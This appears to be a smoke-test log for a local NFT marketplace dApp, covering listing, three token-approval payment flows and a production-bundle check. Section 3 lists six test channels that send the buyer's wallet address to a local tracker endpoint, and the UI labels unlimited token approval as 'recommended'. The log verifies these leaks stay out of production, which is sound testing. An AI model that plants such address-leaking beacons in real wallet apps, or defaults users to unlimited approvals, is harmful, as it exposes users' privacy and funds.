# PermitMarket Smoke Test Log

- **App:** PermitMarket
- **Chain:** Local test chain (Anvil, chainId 31337, port 9130)
- **Token (pUSD):** `0x5FbDB2315678afecb367f032d93F642f64180aa3`
- **NFT (pNFT):** `0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512`
- **Marketplace:** `0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0`
- **Accounts:**
  - Seller: `0x70997970C51812dc3A010C7d01b50e0d17dc79C8` (Anvil key #1)
  - Buyer: `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC` (Anvil key #2)

---

## 1. Seller Flow

1. **Mint Passes**
   - Minted Pass #1: `0xccd313d0ebbcf95ad94afbfdd770f9cd0ba81fd499b8f18246616a3b99d631a7`
   - Minted Pass #2: `0x760561c9eca93bc4d742d0d74acb516374b3342cd5c669ef6e65112465e745aa`
   - Minted Pass #3: `0x9f8ad1958f68551d59d8b8b6f4621e9319b9da9159974d9286b00ec8702c7bc8`
   - Confirmed `ownerOf(1..3)` is Seller.

2. **Approve Marketplace**
   - `setApprovalForAll(Marketplace, true)`: `0x6ce6373a108cdc0503cb7e22e7e4ac93de031cd4ee2ab9132dc507ad1e3f1cea`
   - Confirmed `isApprovedForAll(Seller, Marketplace) == true`.

3. **List Passes**
   - Listed Pass #1 at 10 pUSD: `0xe432a9e2fed2fd7d09bbbfc449f75bb8a2a78220d27bb59ed5ab9a4a9bdc564e` (listingId 1)
   - Listed Pass #2 at 20 pUSD: `0xb5495ea2b7e22c2709f2085b2a2fc56f7eed240bf17233796780e99aa1070756` (listingId 2)
   - Listed Pass #3 at 30 pUSD: `0x5eedd1317841e3f5ece74d15fb221bff74c85bf61239073c5afc82f4878eaae5` (listingId 3)

4. **Cancel & Relist**
   - Cancelled Listing #3: `0xd6a04fdf22a9c20704c8335db23ac74046659806ae2fa1fb711595b1d1f1a49d`
   - Relisted Pass #3 at 30 pUSD: `0xc4f9a43dddea55d1f39b76d12b8addcaade6c6a9a7724fe1fb52486f9f53d09d` (listingId 4)

5. **Self-Buy Guard**
   - Attempted `buy(1)` by Seller: Reverted with error `SellerIsBuyer(1)`. In UI, the "Buy" button is disabled with title "You listed this item".

---

## 2. Buyer Flow

1. **Faucet**
   - Claimed 100 pUSD: `0x69a170512ad3f649bf51845ba07e8e29bacbbd550db454cb39b5006366f848c9`
   - Balance verified on-chain: 100 pUSD (`100000000`).

2. **One-Click Buy (Unlimited Approval)**
   - Option: "Enable one-click buying (recommended)"
   - Step 1 `approve(Marketplace, maxUint256)`: `0xf3b48bc4ead4a3cb67aa375b9cf40ecb407e000c28fae4e041f12958343267b2`
   - Step 2 `buy(1)`: `0xe628b23d06dc4de8ef1965a4b4f1548eba5a2a9f90ad17e3e57451fe8fb7475e`
   - On-chain allowance check: `allowance(Buyer, Marketplace) = 115792089237316195423570985008687907853269984665640564039457584007913129639935` (`2^256 - 1`). Max allowance remains intact.
   - NFT #1 transferred to Buyer.

3. **Approve Exact Amount**
   - First reset allowance `approve(Marketplace, 0)`: `0x9f7bea6ab2d35fc987008aefd84abd675a04d72ce50c6b19ae2c784d36a6414c`
   - Option: "Approve exact amount"
   - Step 1 `approve(Marketplace, 20_000_000)`: `0x207901c9f80ab0527eef2fb4db678d46dec4faaea9ce8b525f62ae6b3cf7373a`
   - Step 2 `buy(2)`: `0x7d3bec88a56f06297b7c2dfddd35ae56936a3bdae9730be157b9ace499104f03`
   - On-chain allowance check: `allowance(Buyer, Marketplace) = 0`.
   - NFT #2 transferred to Buyer.

4. **Pay With Signature (Permit)**
   - Option: "Pay with a signature (permit)"
   - No `approve` transaction required. Buyer signed EIP-712 Permit domain `name="Demo pUSD", version="1"`.
   - Executed `buyWithPermit(4, deadline, v, r, s)`: `0x201bdf92369171f7961a5af20caea05debdb9d7c48e037d3a77dfaf3d161aa57`
   - On-chain allowance check: `allowance(Buyer, Marketplace) = 0`. No standing allowance left behind.
   - NFT #3 transferred to Buyer.

---

## 3. Attack Fixture Verification

- Built fixture with `VITE_TRACKER_URL=http://127.0.0.1:9132/collect`.
- Tested all 6 leakage channels:
  1. `GET /collect?addr=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`
  2. `GET /collect?a=3c44cdddb6a900fa2b585dd299e03d12fa4293bc`
  3. `POST /collect` with JSON `{wallet: "0x3C44..."}`
  4. `POST /collect` with Base64 payload
  5. `POST /collect` with Beacon JSON `{w: "0x3C44..."}`
  6. `GET /collect?px=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`
- Verified `GET http://127.0.0.1:9132/log` recorded all 6 queries.

---

## 4. Production Build Segregation Check

- `node test/no-tracker-check.mjs`:
  Scanned all production artifacts in `dist-local/`. Verified no tracker ports, URLs, beacons, or leak strings exist in the production bundle. Output:
  `production build clean`

